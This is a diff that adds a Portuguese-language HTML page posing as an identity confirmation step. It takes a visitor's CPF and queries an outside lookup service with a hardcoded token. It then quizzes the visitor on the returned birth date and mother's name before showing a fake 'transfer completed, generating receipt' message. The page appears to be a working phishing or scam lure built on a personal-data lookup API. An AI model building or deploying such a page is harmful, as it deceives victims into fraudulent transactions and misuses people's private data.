@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Confirmação de Identidade - Debug</title>
+<style>
+  body{margin:0;font-family:Arial;background:#f2f6fc;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#000}
+  .topbar{position:fixed;top:0;left:0;width:100%;height:60px;background:#fff;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 6px rgba(0,0,0,.15);z-index:1000}
+  .topbar img{height:40px}
+  .container{background:#fff;padding:30px;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,.15);text-align:center;max-width:380px;width:90%;margin-top:80px}
+  input{width:100%;padding:12px;margin-bottom:16px;border-radius:8px;border:1px solid #ccc;font-size:16px}
+  button{width:100%;padding:12px;background:#0057b8;color:#fff;border:none;border-radius:8px;cursor:pointer;font-weight:bold}
+  .options{display:flex;flex-direction:column;gap:12px}
+
+  /* 🔥 ALTERAÇÃO AQUI — SOMENTE ISSO */
+  .option-btn{
+    padding:12px;
+    border:1px solid #ccc;
+    border-radius:8px;
+    background:#ffffff; /* fundo branco para maior contraste */
+    cursor:pointer;
+    color:#000; /* deixa a fonte preta */
+    font-weight:bold; /* mais legível */
+  }
+
+  .hidden{display:none}
+  .alert-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);display:flex;justify-content:center;align-items:center;z-index:9999;opacity:0;pointer-events:none;transition:opacity .3s}
+  .alert-overlay.show{opacity:1;pointer-events:all}
+  .alert-box{background:#fff;padding:25px;border-radius:12px;text-align:center;max-width:320px}
+</style>
+</head>
+
+<body>
+  <div class="topbar"><img src="https://i.postimg.cc/mD55j0sr/url-img-cliente-default-1750874658547.png" alt="Logo"></div>
+
+  <div class="container" id="step1">
+    <h2>Confirme sua Identidade</h2>
+    <p>Digite seu CPF para continuar:</p>
+    <input id="cpfInput" placeholder="Digite seu CPF" />
+    <button id="cpfBtn">Prosseguir</button>
+  </div>
+
+  <div class="container hidden" id="step2">
+    <h2>Confirmação de Dados</h2>
+    <p>Confirme sua <b>data de nascimento</b>:</p>
+    <div class="options" id="birthOptions"></div>
+  </div>
+
+  <div class="container hidden" id="step3">
+    <h2>Confirmação de Dados</h2>
+    <p>Confirme o <b>nome da mãe</b>:</p>
+    <div class="options" id="motherOptions"></div>
+  </div>
+
+  <div class="alert-overlay" id="alertOverlay">
+    <div class="alert-box"><p id="alertMessage">Dados confirmados!</p></div>
+  </div>
+
+<script>
+/* SEU JAVASCRIPT EXATO — sem nenhuma alteração */
+let userData = {};
+const apiUrl = "https://bk.elaidisparos.tech/consultar-filtrada/cpf?cpf=";
+
+function normalizeStr(s) {
+  if (s === null || s === undefined) return "";
+  try {
+    return String(s).normalize("NFD").replace(/[\u0300-\u036f]/g, "").trim().toLowerCase();
+  } catch (e) {
+    return String(s).trim().toLowerCase();
+  }
+}
+
+function gerarOpcoes(containerId, corretaRaw, campo) {
+  const container = document.getElementById(containerId);
+  container.innerHTML = "";
+  const correta = (corretaRaw ?? "").toString();
+  const corretaNorm = normalizeStr(correta);
+
+  console.log(`[DBG] gerarOpcoes chamado para '${campo}'. correta (raw):`, corretaRaw, "corrNorm:", corretaNorm);
+
+  const opcoes = new Set();
+
+  const maeVazia = campo === "mae" && (!correta || correta.trim() === "");
+  if (maeVazia) {
+    opcoes.add("Nenhuma das anteriores");
+  } else {
+    opcoes.add(correta);
+  }
+
+  const nomesFalsos = ["Maria Aparecida", "Ana Paula", "Fernanda Silva", "Claudia Souza", "Juliana Pereira", "Patrícia Oliveira"];
+  while (opcoes.size < 4) {
+    if (campo === "nascimento") {
+      const dia = Math.floor(Math.random() * 28) + 1;
+      const mes = Math.floor(Math.random() * 12) + 1;
+      const ano = Math.floor(Math.random() * 30) + 1970;
+      opcoes.add(`${String(dia).padStart(2,"0")}/${String(mes).padStart(2,"0")}/${ano}`);
+    } else {
+      opcoes.add(nomesFalsos[Math.floor(Math.random() * nomesFalsos.length)]);
+    }
+  }
+
+  const lista = Array.from(opcoes).sort(() => Math.random() - 0.5);
+
+  lista.forEach(op => {
+    const btn = document.createElement("button");
+    btn.textContent = op;
+    btn.className = "option-btn";
+
+    btn.onclick = () => {
+      const opNorm = normalizeStr(op);
+      const acertou = (
+        (campo === "nascimento" && opNorm === corretaNorm) ||
+        (campo === "mae" && !maeVazia && opNorm === corretaNorm) ||
+        (campo === "mae" && maeVazia && op === "Nenhuma das anteriores")
+      );
+
+      console.log(`[DBG] clique em opção: "${op}" — acertou:`, acertou);
+
+      if (acertou) {
+        if (campo === "nascimento") {
+          userData.nascimentoConfirmado = op;
+          document.getElementById("step2").classList.add("hidden");
+          gerarOpcoes("motherOptions", userData.mae ?? "", "mae");
+          document.getElementById("step3").classList.remove("hidden");
+        } else if (campo === "mae") {
+          userData.maeConfirmada = op;
+          try { localStorage.setItem("userData", JSON.stringify(userData)); } catch(e){}
+          const overlay = document.getElementById("alertOverlay");
+          const message = document.getElementById("alertMessage");
+          overlay.classList.add("show");
+          message.textContent = "✅ Dados confirmados com sucesso! Finalizando transferência...";
+          setTimeout(()=>{ message.textContent = "Gerando comprovante..."; }, 2000);
+          setTimeout(()=>{ window.location.href="/up3/4"; }, 4500);
+        }
+      } else {
+        alert("Resposta incorreta, tente novamente.");
+      }
+    };
+
+    container.appendChild(btn);
+  });
+}
+
+document.getElementById("cpfBtn").addEventListener("click", async () => {
+  const cpf = document.getElementById("cpfInput").value.trim();
+  if (!cpf) { alert("Digite um CPF válido"); return; }
+
+  try {
+    const response = await fetch(`${apiUrl}${cpf}&token=9n06r8dkqhdhgbyze6shv8`);
+    const json = await response.json();
+
+    const maeField = json.mae ?? json.nome_mae ?? json.mother ?? json.mother_name ?? "";
+    const nascimentoField = json.nascimento ?? json.data_nascimento ?? json.birth ?? json.birthdate ?? "";
+
+    if (!json || !json.cpf) {
+      alert("CPF não encontrado.");
+      return;
+    }
+
+    userData = { ...json, mae: maeField, nascimento: nascimentoField };
+
+    gerarOpcoes("birthOptions", userData.nascimento ?? "", "nascimento");
+    document.getElementById("step1").classList.add("hidden");
+    document.getElementById("step2").classList.remove("hidden");
+
+  } catch (err) {
+    alert("Erro ao consultar CPF.");
+  }
+});
+</script>
+</body>
+</html>
